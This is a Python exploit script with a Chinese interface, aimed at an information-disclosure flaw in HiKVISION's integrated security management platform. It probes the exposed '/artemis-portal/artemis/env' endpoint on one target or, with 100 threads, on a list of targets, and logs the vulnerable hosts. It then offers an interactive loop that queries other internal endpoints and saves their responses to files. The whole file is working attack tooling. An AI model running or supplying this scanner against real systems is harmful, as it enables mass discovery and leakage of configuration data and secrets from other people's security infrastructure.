import requests,sys,argparse,os,re,json,time
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
GREEN = '\033[92m' #输出颜色
RESET = '\033[0m'

def banner():
    test = """                    
_______________   __
_  _ \_  __ \_ | / /
/  __/  / / /_ |/ / 
\___//_/ /_/_____/  
                    """
    print(test)

def main():
    banner()
    parser = argparse.ArgumentParser(description='HiKVISION综合安防管理平台env信息泄漏')
    parser.add_argument('-u','--url',dest='url',type=str,help='input your url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input your file')
    args = parser.parse_args()

    if args.url and not args.file:
        if poc(args.url):
            exp(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file,'r',encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    else:
        print(f'Usag:\n\t python3 {sys.argv[0]} -h')

def poc(target):
    payload1 = '/artemis-portal/artemis/env'
    try:
        res1 = requests.get(url=target+payload1,verify=False,timeout=10)
        js1 = json.loads(res1.text)['profiles']
        if 'prod' in js1:
            print(f'[+]存在漏洞：{target}')
            with open('result.txt','a',encoding='utf-8') as fp:
                fp.write(target+'\n')
                return True
        else:
            return False
    except Exception as e:
        print(f'[!]网站异常，请手工测试：{target}')
        return False

def exp(target):
    print('--------请稍候--------')
    time.sleep(2)
    while True:
        api = input('请输入想要查询的接口：')
        payload2 = f'/artemis-portal/artemis/{api}'
        try:
            if api == 'q':
                exit()
            res2 = requests.get(url=target+payload2,verify=False,timeout=10)
            js2 = json.loads(res2.text)
            print(GREEN,js2,RESET)
            with open(f'{api}.txt','w',encoding='utf-8') as fp:
                fp.write(res2.text)
        except Exception as e:
            pass


if __name__ == '__main__':
    main()